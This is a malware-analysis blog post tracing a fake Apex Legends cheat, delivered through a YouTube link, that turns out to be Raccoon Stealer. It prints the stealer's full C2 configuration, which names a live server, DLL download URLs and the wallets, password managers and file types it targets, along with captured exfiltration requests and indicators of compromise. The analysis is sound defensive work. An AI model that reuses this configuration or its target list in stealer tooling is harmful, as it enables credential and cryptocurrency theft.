---
title: "FREE APEX LEGENDS HACK?! (but really raccoon stealer 🦝)"
layout: post
tag:
- malware
- analysis
category: blog
---

This weekend, I decided to take a break from my usual programming projects and explore something new. So, I did what any other normal person would do -- browse YouTube for some **FREE APEX LEGENDS HACKS**!11!!1!!

(Don't worry, I'm not a cheater, but I knew this would be a sure-fire way to find something malicious 😏)

One video which boasted a cheat with features like aimbot and wallhack with *toootally* legitimate and supportive comments, from a channel that has over 88k loyal subscribers, looked like an attractive candidate.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/YouTube_Video.png)

The video's description contained a download link, which led to a post on Telegraph, Telegram's anonymous and minimalistic blogging platform. The generic message in the post seems to have been designed for easy reuse in other alluring offers.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Telegram_Blog.png)

The download link provided a WinRAR archive called `Pass_1234_Setup.rar` containing a single executable generically named `Setup.exe` along with various DLLs, CAB, and TXT files spread across multiple directories. Seen in the screenshot below, `Setup.exe` is also fairly large at a size of 1,243,506,782 bytes (~1.15GiB) which may be a deliberate attempt to prevent users from uploading the file to online malware scanners like VirusTotal which supports uploading a maximum file size of 650MB.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/RAR_File.png)

The entire directory tree can be seen below.

```
C:\USERS\USER\DOWNLOADS\PASS_1234_SETUP
│   Setup.exe
└───Plugins
    ├───libs
    │   ├───revulytics
    │   │       ruiSDKDotNet_5.5.0.dll, ruiSDK_5.5.0.x64.dll, ruiSDK_5.5.0.x86.dll
    │   │
    │   ├───sharpvectors
    │   │       SharpVectors.Converters.Wpf.dll, SharpVectors.Core.dll, SharpVectors.Css.dll, SharpVectors.Dom.dll, SharpVectors.Model.dll, SharpVectors.Rendering.Wpf.dll, SharpVectors.Runtime.Wpf.dll
    │   │
    │   └───telerik
    │           Telerik.Windows.Controls.Data.dll, Telerik.Windows.Controls.DataVisualization.dll, Telerik.Windows.Controls.Diagrams.dll, Telerik.Windows.Controls.Diagrams.Extensions.dll, Telerik.Windows.Controls.dll, Telerik.Windows.Controls.Docking.dll, Telerik.Windows.Controls.FileDialogs.dll, Telerik.Windows.Controls.GridView.dll, Telerik.Windows.Controls.Input.dll, Telerik.Windows.Controls.Navigation.dll, Telerik.Windows.Data.dll, Telerik.Windows.Diagrams.Core.dll
    │
    └───resources
            p6a4arww.cab, p6a4bgww.cab, p6a4daww.cab, p6a4elww.cab, p6a4enww.cab, p6a4etww.cab, p6a4fiww.cab, p6a4heww.cab, p6a4hrww.cab, p6a4idww.cab, p6a4kkww.cab, p6a4ltww.cab, p6a4lvww.cab, p6a4nlww.cab, p6a4noww.cab, p6a4ptww.cab, p6a4roww.cab, p6a4trww.cab, strings-ar.txt, strings-cs.txt, strings-da.txt, strings-de.txt, strings-en.txt, strings-es.txt, strings-fi.txt, strings-fr.txt, strings-he.txt, strings-hu.txt, strings-it.txt, strings-ja.txt, strings-ko.txt, strings-nb.txt, strings-nl.txt, strings-pl.txt, strings-pt-br.txt, strings-pt-pt.txt, strings-pt.txt, strings-ru.txt, strings-sk.txt, strings-sv.txt, strings-tr.txt, strings-zh-Hans.txt, strings-zh-Hant.txt, strings.txt
```

Upon inspection, the `Setup.exe` executable appears to be digitally signed by `AhnLab, Inc.`, a provider of endpoint security solutions. However, the certificate signature is actually invalid due to a `HashMismatched` error. This can occur when a binary has been modified after being digitally signed or when the digital certificate has been stolen from another signed binary using a tool like [SigThief](https://github.com/secretsquirrel/SigThief), which seems far more likely in this case.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Executable_Signature.png)

Loading the executable in [PE-Bear](https://github.com/hasherezade/pe-bear) for some basic static analysis reveals several sections named `.vmp#`, indicating that the binary has been packed by VMProtect. Attempts to execute the binary with a debugger attached also show that it has anti-debugging checks in place to hinder analysis.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Executable_Sections.png)

When executing `Setup.exe` normally, nothing seems to happen visibly as no windows open and no errors are thrown. However, we can leverage tools like [ProcMon](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) and [API Monitor](http://www.rohitab.com/apimonitor) to gain insights into what it's doing behind the scenes. For example, although VMProtect obfuscates API calls and encrypts strings, preventing us from finding all of the API function calls used by the executable, we can still see a list of dynamic imports by monitoring calls to the [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Dynamic_Imports.png)

While using `fakenet-ng` to divert traffic, we can also see that `Setup.exe` attempts to make a `POST` request to the IP address `185.181.10.208` across port 80. The request contains an odd looking `User-Agent` of `AYAYAYAY1337` with a body message that includes a GUID as the `machineId`, the current user's username, and a `configId` field. This communication with a C&C server and the unique `User-Agent` are typical of Raccoon Stealer. Nothing happens after this point, as the diverter prevents it from receiving a real response.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/fakenet-ng.png)

When executing the binary again without diverting any requests and taking a packet capture, we can see that much more occurs after a successful `POST` request.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Wireshark_Captures.png)

These frames reveal that a successful `POST` request returns a configuration file with download links for other DLLs and a list of items to exfiltrate. This includes data for crypto wallets and related extensions, screenshots of the environment, Telegram and Discord related data, and files with interesting names or types that match txt/rtf/doc/png/jpg/key/wallet/seed/etc. The configuration file is also consistent with other observed cases and analysis of Raccoon Stealer.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Initial_POST_Response.png)

The full contents of the configuration file can be seen below:
```
libs_nss3:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/nss3.dll
libs_msvcp140:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/msvcp140.dll
libs_vcruntime140:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/vcruntime140.dll
libs_mozglue:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/mozglue.dll
libs_freebl3:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/freebl3.dll
libs_softokn3:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/softokn3.dll
ews_meta_e:ejbalbakoplchlghecdalmeeeajnimhm;MetaMask;Local Extension Settings
ews_tronl:ibnejdfjmmkpcnlpebklmnkoeoihofec;TronLink;Local Extension Settings
libs_sqlite3:http://185.181.10.208/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.dll
ews_bsc:fhbohimaelbohpjbbldcngcnapndodjp;BinanceChain;Local Extension Settings
ews_ronin:fnjhmkhhmkbjkkabndcnnogagogbneec;Ronin;Local Extension Settings
wlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dictionar*
wlts_atomic:Atomic;26;atomic;*;*cache*,*IndexedDB*
wlts_jaxxl:JaxxLiberty;26;com.liberty.jaxx;*;*cache*
wlts_binance:Binance;26;Binance;*app-store.*,*.fp;-
wlts_coinomi:Coinomi;28;Coinomi\Coinomi\wallets;*;-
wlts_electrum:Electrum;26;Electrum\wallets;*;-
wlts_elecltc:Electrum-LTC;26;Electrum-LTC\wallets;*;-
wlts_elecbch:ElectronCash;26;ElectronCash\wallets;*;-
wlts_guarda:Guarda;26;Guarda;*;*cache*,*IndexedDB*
wlts_green:BlockstreamGreen;28;Blockstream\Green;*;cache,gdk,*logs*
wlts_ledger:Ledger Live;26;Ledger Live;*;*cache*,*dictionar*,*sqlite*
ews_ronin_e:kjmoohlgokccodicjjfebfomlbljgfhk;Ronin;Local Extension Settings
ews_meta:nkbihfbeogaeaoehlefnkodbefgpgknn;MetaMask;Local Extension Settings
sstmnfo_System Info.txt:System Information:
|Installed applications:
|
wlts_daedalus:Daedalus;26;Daedalus Mainnet;*;log*,*cache,chain,dictionar*
wlts_mymonero:MyMonero;26;MyMonero;*;*cache*
wlts_xmr:Monero;5;Monero\\wallets;*.keys;-
wlts_wasabi:Wasabi;26;WalletWasabi\\Client;*;*tor*,*log*
ews_metax:mcohilncbfahbmgdjkbpemcciiolgcge;MetaX;Local Extension Settings
ews_xdefi:hmeobnfnfcmdkdcmlblgagmfpfboieaf;XDEFI;IndexedDB
ews_waveskeeper:lpilbniiabackdjcionkobglmddfbcjo;WavesKeeper;Local Extension Settings
ews_solflare:bhhhlbepdkbapadjdnnojkbgioiodbic;Solflare;Local Extension Settings
ews_rabby:acmacodkjbdgmoleebolmdjonilkdbch;Rabby;Local Extension Settings
ews_cyano:dkdedlpgdmmkkfjabffeganieamfklkm;CyanoWallet;Local Extension Settings
ews_coinbase:hnfanknocfeofbddgcijnmhnfnkdnaad;Coinbase;IndexedDB
ews_auromina:cnmamaachppnkjgnildpdmkaakejnhae;AuroWallet;Local Extension Settings
ews_khc:hcflpincpppdclinealmandijcmnkbgn;KHC;Local Extension Settings
ews_tezbox:mnfifefkajgofkcjkemidiaecocnkjeh;TezBox;Local Extension Settings
ews_coin98:aeachknmefphepccionboohckonoeemg;Coin98;Local Extension Settings
ews_temple:ookjlbkiijinhpmnjffcofjonbfbgaoc;Temple;Local Extension Settings
ews_iconex:flpiciilemghbmfalicajoolhkkenfel;ICONex;Local Extension Settings
ews_sollet:fhmfendgdocmcbmfikdcogofphimnkno;Sollet;Local Extension Settings
ews_clover:nhnkbkgjikgcigadomkphalanndcapjk;CloverWallet;Local Extension Settings
ews_polymesh:jojhfeoedkpkglbfimdfabpdfjaoolaf;PolymeshWallet;Local Extension Settings
ews_neoline:cphhlgmgameodnhkjdmkpanlelnlohao;NeoLine;Local Extension Settings
ews_keplr:dmkamcknogkgcdfhhbddcghachkejeap;Keplr;Local Extension Settings
ews_terra_e:ajkhoeiiokighlmdnlakpjfoobnjinie;TerraStation;Local Extension Settings
ews_terra:aiifbnbfobpmeekipheeijimdpnlpgpp;TerraStation;Local Extension Settings
ews_liquality:kpfopkelmapcoipemfendmdcghnegimn;Liquality;Local Extension Settings
ews_saturn:nkddgncdjgjfcddamfgcmfnlhccnimig;SaturnWallet;Local Extension Settings
ews_guild:nanjmdknhkinifnkgdcggcfnhdaammmj;GuildWallet;Local Extension Settings
ews_phantom:bfnaelmomeimhlpmgjnjophhpkkoljpa;Phantom;Local Extension Settings
ews_tronlink:ibnejdfjmmkpcnlpebklmnkoeoihofec;TronLink;Local Extension Settings
ews_brave:odbfpeeihdkbihmopkbjmoonfanlbfcl;Brave;Local Extension Settings
ews_meta_e:ejbalbakoplchlghecdalmeeeajnimhm;MetaMask;Local Extension Settings
ews_ronin_e:kjmoohlgokccodicjjfebfomlbljgfhk;Ronin;Local Extension Settings
ews_mewcx:nlbmnnijcnlegkjjpcfjclmcfggfefdm;MEW_CX;Sync Extension Settings
ews_ton:nphplpgoakhhjchkkhmiggakijnkhfnd;TON;Local Extension Settings
ews_goby:jnkelfanjkeadonecabehalmbgpfodjm;Goby;Local Extension Settings
ews_ton_ex:nphplpgoakhhjchkkhmiggakijnkhfnd;TON;Local Extension Settings
ews_Cosmostation:fpkhgmpbidmiogeglndfbkegfdlnajnf;Cosmostation;Local Extension Settings
ews_bitkeep:jiidiaalihmmhddjgbnbgdfflelocpak;BitKeep;Local Extension Settings
ews_stargazer:pgiaagfkgcbnmiiolekcfmljdagdhlcm;Stargazer;Local Extension Settings
ews_clv:nhnkbkgjikgcigadomkphalanndcapjk;CloverWallet;Local Extension Settings
ews_jaxxlibertyext:cjelfplplebdjjenllpjcblmjkfcffne;JaxxLibertyExtension;Local Extension Settings
ews_enkrypt:kkpllkodjeloidieedojogacfhpaihoh;Enkrypt;Local Extension Settings
ews_gamestop:pkkjjapmlcncipeecdmlhaipahfdphkd;GameStop Wallet;Local Extension Settings
ews_xds:aholpfdialjgjfhomihkjbmgjidlcdno;Exodus Web3 Wallet;Local Extension Settings
xtntns_authenticatorcc:bhghoamapcdpbohphigoooaddinpkbai;Authenticator.cc;Sync Extension Settings
xtntns_keepassxc_browser:oboonakemofpalcgghocfoadofidjkkk;KeePassXC Browser;Local Extension Settings
xtntns_keepassTusk:fmhmiaejopepamlcjkncpgpdjichnecm;KeePass Tusk;Local Extension Settings
xtntns_bitwardenEx:nngceckbapebfimnlniiiahkandclblb;Bitwarden;Local Extension Settings
xtntns_microsoftAfL:fiedbfgcleddlbcmgdigjgdfcggjcion;Microsoft Autofill Local;Local Extension Settings
xtntns_microsoftAfS:fiedbfgcleddlbcmgdigjgdfcggjcion;Microsoft Autofill Sync;Sync Extension Settings
ews_martian:efbglgofoippbgcjepnhiblaibcnclgk;Martian Aptos;Local Extension Settings
ews_braavos_c:jnlgamecbpmbajjfhmmmlhejkemejdma;Braavos;Local Extension Settings
ews_okx_c:mcohilncbfahbmgdjkbpemcciiolgcge;OKX;Local Extension Settings
ews_pontem_c:phkbamefinggmakgklpkljjmgibohnba;Pontem Aptos;Local Extension Settings
ews_sender_c:epapihdplajcdnnkdeiahlgigofloibg;SenderWallet;Local Extension Settings
ews_hashpack_c:gjagmgiddbbciopjhllkdnddhcglnemk;Hashpack;Local Extension Settings
ews_ever_c:cgeeodpfagjceefieflmdfphplkenlfk;EVER;Local Extension Settings
ews_finnie_c:cjmkndjhnagcfbpiemnkdpomccnjblmj;Finnie;Local Extension Settings
ews_leap_terra_c:aijcbedoijmgnlmjeegjaglmepbmpkpi;LeapTerra;Local Extension Settings
ews_petra_atos_c:ejjladinnckdgjemekebdpeokbikhfci;Petra Aptos;Local Extension Settings
ews_eternl_c:kmhcihpebfmpgmihbkipmjlmmioameka;Eternl;Local Extension Settings
ews_gero_wlt_c:bgpipimickeadkjlklgciifhnalhdjhe;GeroWallet;Local Extension Settings
ews_Nami:lpfcbjknijpeeillifnkikgncikgfhdo;Nami Wallet;Local Extension Settings
ews_slope:pocmplpaccanhmnllbbkpgfliimjljgo;Slope Wallet;Local Extension Settings
ews_trust:egjidjbpglichdcondbcbdnbeeppgdph;Trust Wallet Extension;Local Extension Settings
ews_safepalext:lgmpcpglpngdoalbgeoldeajfclnhafa;Safepal Extension;Local Extension Settings
scrnsht_Screenshot.jpeg:1
tlgrm_Telegram:Telegram Desktop\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*
dscrd_Discord:discord\Local Storage\leveldb|*.log,*.ldb|-
grbr_Desktop:%USERPROFILE%\Desktop\|*.txt,*.rtf,*.doc*,*.png,*.jpg,*.jpeg,*key*,*wallet*,*seed*|-|1000|1|0|files
grbr_Documents:%USERPROFILE%\Documents\|*.txt,*.rtf,*.doc*,*.png,*.jpg,*.jpeg,*key*,*wallet*,*seed*|-|1000|0|0|files
token:aca595f92b0b69370cc7097020545576
```

The `token` field in the last line is referenced later in the URI when exfiltrating data which appears to be an unique identifer for the current execution.

We can also see that the executable immediately downloads the DLLs listed next to the `libs_*` identifiers after it receives the configuration file and writes them to the `%UserProfile%\AppData\LocalLow` directory in our ProcMon capture.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/ProcMon_Writes.png)

These libraries all serve unique purposes, and their use aligns with Raccoon Stealer's modus operandi:
1. [nss3.dll](https://www.virustotal.com/gui/file/c65b7afb05ee2b2687e6280594019068c3d3829182dfe8604ce4adf2116cc46e) - Network Security Services, signed by Mozilla, possibly leveraged to establish encrypted communication channels.
2. [sqlite3.dll](https://www.virustotal.com/gui/file/47b64311719000fa8c432165a0fdcdfed735d5b54977b052de915b1cbbbf9d68) - SQLite library that provides a lightweight SQL database engine, used to dump saved credentials, cookies, and credit card information from local databases of web browsers.
3. [freebl3.dll](https://www.virustotal.com/gui/file/b2ae93d30c8beb0b26f03d4a8325ac89b92a299e8f853e5caa51bb32575b06c6) - Part of Network Security Services, signed by Mozilla, which provides low-level cryptographic functions.
4. [mozglue.dll](https://www.virustotal.com/gui/file/4191faf7e5eb105a0f4c5c6ed3e9e9c71014e8aa39bbee313bc92d1411e9e862) - Library by Mozilla that is likely used to dump information from Firefox.
5. [msvcp140.dll](https://www.virustotal.com/gui/file/2db7fd3c9c3c4b67f2d50a5a50e8c69154dc859780dd487c28a4e6ed1af90d01) - Microsoft C++ runtime library that the application likely relies on.
6. [softokn3.dll](https://www.virustotal.com/gui/file/44be3153c15c2d18f49674a092c135d3482fb89b77a1b2063d01d02985555fe0) - Part of Network Security Services, signed by Mozilla, that provides cryptographic token management functions.
7. [vcruntime140.dll](https://www.virustotal.com/gui/file/9d02e952396bdff3abfe5654e07b7a713c84268a225e11ed9a3bf338ed1e424c) - Microsoft C++ runtime library that the application likely relies on.

The following is the SQL query used for dumping saved credit card information which depends on the `sqlite3.dll` module above.

![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/APIMonitor_SQL_Query.png)

After the executable finishes enumerating through the entire filesystem and extracting relevant data, it then makes several `POST` requests back to the server to exfiltrate this data at the path specified by `token` in the initial configuration file. The body of these request messages includes exactly what was specified in the configuration file: system information, a comprehensive list of applications installed, credentials, cookies, saved credit card information, screenshot of the desktop, and interesting files. This focus on exfiltrating sensitive data matches Raccoon Stealer's typical behavior.

Request 1:
```
--MtAoe1n2XXm40cqt
Content-Disposition: form-data; name="file"; filename="System Info.txt"
Content-Type: application/x-object

System Information:
    - Locale: English
    - Time zone:     - OS: Windows 10 Pro
    - Architecture: x64
    - CPU: Intel(R) Core(TM) i7-10700T CPU @ 2.00GH (4 cores)
    - RAM: 8191 MB
    - Display size: 2560x1354
    - Display Devices:
        0) VMware SVGA 3D

Installed applications:
    7-Zip 22.01 (x64)
    Notepad++ (64-bit x64) 8.4.6
    Process Hacker 2.39 (r124) 2.39.0.124
    Sublime Text 3
    Vim 8.1 (self-installing)
    WinRAR 6.21 (64-bit) 6.21.0
    Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219
    Python 3.7.9 Utility Scripts (64-bit) 3.7.9150.0
    (.. TRUNCATED ..)

--MtAoe1n2XXm40cqt--
```

Request 2:
```
--KjK4ma99z46dDd7G
Content-Disposition: form-data; name="file"; filename="\cookies.txt"
Content-Type: application/x-object

.c.bing.com    TRUE    /    TRUE    13327963108935076    MR    djEwjj/h6PhIoOYXxECNs9JoIVhaY5uwLX/nv8qWyIM=
.bing.com    TRUE    /    TRUE    13361054308934995    MUID    djEw1haeNG3MrxG0eq54BsvPyQFS0zQl/rQJ4MUqkudRRyD/FNvDsz5/q0sNGj0kXG3GX+FgS7BFKZVQEloO
.msn.com    TRUE    /    TRUE    13361054307371802    MUID    djEw9vJzABKuWAPGFySr/qLCB9GhNMupcUl4ahQfC9AIBG2z2MatLiUzD9E7ALrNxpFzzzmuU/m6V/zsRJ9R
ntp.msn.com    TRUE    /    TRUE    13358894307166718    MicrosoftApplicationsTelemetryDeviceId    djEwvXs6qpAluAuPO5Ri5bv81QZz0IouY5+XKjQfeeEqI0eU7dHG8qZrL4lY0FtrTe6tGFtN5RkXjyzGX0vgVzEC+g==
.msn.com    TRUE    /    TRUE    13361918306371714    USRLOC    djEwucuGRDZe+PTTCHfPkCvzQ7wUMeIGSgceSKzQmA==
.msn.com    TRUE    /    FALSE    0    _EDGE_S    djEwC4ayDzZkvvwgz/kJr0wQkdx1FOxwMcy8OZMjmj+QAQ==
.msn.com    TRUE    /    FALSE    13361054307371785    _EDGE_V    djEwxX/fqq4R0/71+uTHD3fNc9rMS5gcI6jUp8RY0qA=
.msn.com    TRUE    /    FALSE    13358894311000000    _SS    djEwZJwf9Yg7+uN+03aG4eQfRrUj9ow0wYU3SYT6XxT/1oADUg==
.mgid.com    TRUE    /    TRUE    13327360109077178    __cf_bm    djEwuOMSO7Eh4PPXJ1zPIYgRyVddlQf7aKzrWQjrdR7mSyuknJ9fnoe+fnJnJ9A89/RTOcSYHaZHieLIfUbPF7sOP1UvnvInHtN+MKsdpCfItdFCjV2Rj504+HjoHQGdQnZDj8E3A3miTcHhqeRcX/XnPdlUgn6ANQY6kyMpeow7VYQlrF0QNgV1BlTcK94KtHoRSlv5EsH/S5n4cZNLKuOsGrxghwQrpwOR2CiSNoE=
.mediago.io    TRUE    /    TRUE    13358894310123922    __mguid_    djEwbqTE55ezdvHBXy13Enbi+178RvNOuWt6LL/Zj4t7lm2tdiVAPOV2YLHrHzbYDB0tuY0pufzbUiUnrMnT
.popin.cc    TRUE    /    TRUE    13358894310826246    __mguid_    djEwNmfsEZO4d2XGGkhSyxs73hmq7oH6FqzktoCzvMfTkDIbVCxKscJQoOzzyJNOnq9WyuEqJIcXS6V5vmD4
.adnxs.com    TRUE    /    TRUE    13335134310134879    anj    djEwMbfw2t0OwPKAFhvbbktZ91xO6Z+3ahrmKuFPWFUZJv3QGOGzy0PatblQRiAdGzGziiEVHHbf+romNB3WXn708g8CC70e3zUOWC+cqTM67LOm6TIzXBZ1UjGDV4eUiYtgjZFI+J230oFAJNuDCP5DY7kt0uy+wu04atohg/PAvyfSvS1lJOQ2vtjhwEDhDLgp83apYQ==
.linkedin.com    TRUE    /    TRUE    13358894308522104    bcookie    djEwJkF/aiIUkc3OER39+XCtMBArffrqrZiJiUYpIHpuvkAaVxUG1Mo56Dm6b7NhVlFs6Xi7VT96N1fMVb1msjj9ALHiD32QBQ==
.linkedin.com    TRUE    /    TRUE    13327444708522173    lidc    djEwvq2an0jaPSmqYOhZxuxWOVri0+atHnWbNYdx7jCiBGlAs2vU4jVY4BJdOhEhn4zLzKXXbstJCtWdQTF/X+7xot9n40uAj92rzzsapmJwAM88rV756eXvDiebDdP+g6PKjp+k5Ca1ct0bBEpTOmgR4ij0fUs9y5frquw0TTisrz8LHxShHMJeTQ==
cm.mgid.com    TRUE    /    TRUE    13329950309141072    mg_sync    djEwOEHqbk76febfamwD+wP53mxSTNNnQt4V4fPCI/bgGaENoAjGfGMWXSUUIU4yV9sL3w==
.mgid.com    TRUE    /    TRUE    13358894309077108    muidn    djEwhOLg80KSeKqxv1EMyLPRBZGvQ9ITZRi03qP/br3hbqbSKN4OY3zsrw==
.msn.com    TRUE    /edge    FALSE    13343083106000000    pglt-edgeChromium-dhp    djEweOSkynxMHY3j9fvYE+RyvTwvSm5CTRGViF8zeXfILdk=
ntp.msn.com    TRUE    /    FALSE    13361918306371488    sptmarket    djEwnFkB7V+VF+t7oqc5JHpgHZ5HHD8eXPlmAlPATOLNNE03lvV8gKOHt+s7H11AlZwg9kd0TInNtBG0up5MzGW7E2kG/O4Bq7ezFGhDFpknLeL0jwmpJhPQkvMhZJrPnN59FnDhvuGVKPIwiNIX6j733NYfgVus
.adnxs.com    TRUE    /    TRUE    13335134310134914    uuid2    djEwUCYepvQW/xl2mW+8eRHz4aNErDXA0KNiD6hwToXq/cQpms1EXNuF8Z9z0S0vWg==
C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default|+GMiWVsFjgErPV5sGizafV4Ltvpb4SyJ2ur7vfWMNsw=|106.0.1370.52-64
--KjK4ma99z46dDd7G
Content-Disposition: form-data; name="file"; filename="\CC.txt"
Content-Type: application/x-object

C:\Users\User\AppData\Local\Microsoft\Edge\User Data\Default|+GMiWVsFjgErPV5sGizafV4Ltvpb4SyJ2ur7vfWMNsw=|106.0.1370.52-64

--KjK4ma99z46dDd7G--
```

Request 3:
```
--82izw0y2587F6Nfq
Content-Disposition: form-data; name="file"; filename="---Screenshot.jpeg"
Content-Type: application/x-object

ÿØÿà JFIF  ` `  ÿÛ C         
 $.' ",#(7),01444'9=82<.342ÿÛ C            2!!22222222222222222222222222222222222222222222222222ÿÀ J
 " ÿÄ           
ÿÄ µ   } !1AQa"q2‘¡#B±ÁRÑð$3br‚
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzƒ„…†‡ˆ‰Š’“”•–—˜™š¢£¤¥¦§¨©ª²³´µ¶·¸¹ºÂÃÄÅÆÇÈÉÊÒÓÔÕÖ×ØÙÚáâãäåæçèéêñòóôõö÷øùúÿÄ        
ÿÄ µ  w !1AQaq"2B‘¡±Á    #3RðbrÑ

(.. TRUNCATED ..)
```

The executable then exits at this point, with no other indicators of persistence or stages deployed. It never accesses any of the files located in the `Plugins` directory that it comes bundled with either which leads me to believe that they are dummy files to misdirect users and appear more legitimate.

Some IOCs to look out for:

| Type       | IOC                                                              | Description                                          |
|------------|------------------------------------------------------------------|------------------------------------------------------|
| IP Address | 185.181.10.208                                                   | Raccoon Stealer C&C Server IP address                |
| User-Agent | AYAYAYAY1337                                                     | String found in the User-Agent of HTTP requests      |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/nss3.dll                              | URI for downloading additional libraries             |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/msvcp140.dll                          | URI for downloading additional libraries             |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/vcruntime140.dll                      | URI for downloading additional libraries             |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/mozglue.dll                           | URI for downloading additional libraries             |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/freebl3.dll                           | URI for downloading additional libraries             |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/softokn3.dll                          | URI for downloading additional libraries             |
| URI        | /\<TOKEN_FROM_CONFIG_FILE>/sqlite3.dll                           | URI for downloading additional libraries             |
| Hash       | ae0602287fae34b7797d0b1bb5aaeabfec44b004bf3165ffa1bbafae6045d3be | File hash for Setup.exe                              |
| Hash       | c65b7afb05ee2b2687e6280594019068c3d3829182dfe8604ce4adf2116cc46e | File hash for nss3.dll (HAS LEGITIMATE USES)         |
| Hash       | c65b7afb05ee2b2687e6280594019068c3d3829182dfe8604ce4adf2116cc46e | File hash for nss3.dll (HAS LEGITIMATE USES)         |
| Hash       | 47b64311719000fa8c432165a0fdcdfed735d5b54977b052de915b1cbbbf9d68 | File hash for sqlite3.dll (HAS LEGITIMATE USES)      |
| Hash       | b2ae93d30c8beb0b26f03d4a8325ac89b92a299e8f853e5caa51bb32575b06c6 | File hash for freebl3.dll (HAS LEGITIMATE USES)      |
| Hash       | 4191faf7e5eb105a0f4c5c6ed3e9e9c71014e8aa39bbee313bc92d1411e9e862 | File hash for mozglue.dll (HAS LEGITIMATE USES)      |
| Hash       | 2db7fd3c9c3c4b67f2d50a5a50e8c69154dc859780dd487c28a4e6ed1af90d01 | File hash for msvcp140.dll (HAS LEGITIMATE USES)     |
| Hash       | 44be3153c15c2d18f49674a092c135d3482fb89b77a1b2063d01d02985555fe0 | File hash for softokn3.dll (HAS LEGITIMATE USES)     |
| Hash       | 9d02e952396bdff3abfe5654e07b7a713c84268a225e11ed9a3bf338ed1e424c | File hash for vcruntime140.dll (HAS LEGITIMATE USES) |

Stay safe and don't cheat in video games! 😉

---

P.S. Raccoons may be cute but otters are cuter.
![](/assets/images/posts/2023-05-01-FREE-APEX-LEGENDS-HACK-but-really-raccoon-stealer/Otter.jpg)